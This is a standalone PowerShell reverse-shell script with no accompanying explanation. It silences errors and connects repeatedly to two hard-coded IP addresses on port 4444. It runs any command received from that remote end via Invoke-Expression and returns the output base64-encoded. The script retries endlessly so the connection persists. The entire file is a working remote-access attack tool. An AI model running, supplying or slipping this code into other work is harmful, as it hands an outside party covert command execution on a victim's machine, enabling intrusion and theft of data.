$ErrorActionPreference = 'SilentlyContinue'

$Servers = @('192.168.137.1', '192.168.86.20')
$Port = 4444
$TimeoutSec = 300

function Connect-Server {
    foreach ($srv in $Servers) {
        $t = New-Object Net.Sockets.TcpClient
        try {
            $iar = $t.BeginConnect($srv, $Port, $null, $null)
            if ($iar.AsyncWaitHandle.WaitOne(3000) -and $t.Connected) {
                $t.EndConnect($iar)
                return $t
            }
        } catch { }
        try { $t.Close() } catch { }
    }
    return $null
}

while ($true) {
    $c = Connect-Server
    if ($null -eq $c) { Start-Sleep -Seconds 10; continue }

    try {
        try { $c.Client.SetSocketOption([Net.Sockets.SocketOptionLevel]::Socket, [Net.Sockets.SocketOptionName]::KeepAlive, $true) } catch {}

        $r = New-Object IO.StreamReader($c.GetStream())
        $w = New-Object IO.StreamWriter($c.GetStream())
        $w.AutoFlush = $true

        while ($true) {
            $cmd = $r.ReadLine()
            if ($null -eq $cmd -or $cmd -eq 'EXIT') { break }

            $res = ''
            if ($cmd.Trim().Length -gt 0) {
                $j = Start-Job -ScriptBlock {
                    param($s)
                    try { Invoke-Expression $s 2>&1 | Out-String } catch { "ERR: $($_.Exception.Message)" }
                } -ArgumentList $cmd
                if (Wait-Job $j -Timeout $TimeoutSec) {
                    $res = Receive-Job $j 2>&1 | Out-String
                } else {
                    $res = "TIMEOUT(${TimeoutSec}s)"
                    Stop-Job $j
                }
                Remove-Job $j -Force
            }

            $payload = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes([string]$res))
            $w.WriteLine('EOC')
            $w.WriteLine($payload)
            $w.WriteLine('EOC')
        }
    } catch { }

    try { $c.Close() } catch { }
    Start-Sleep -Seconds 10
}
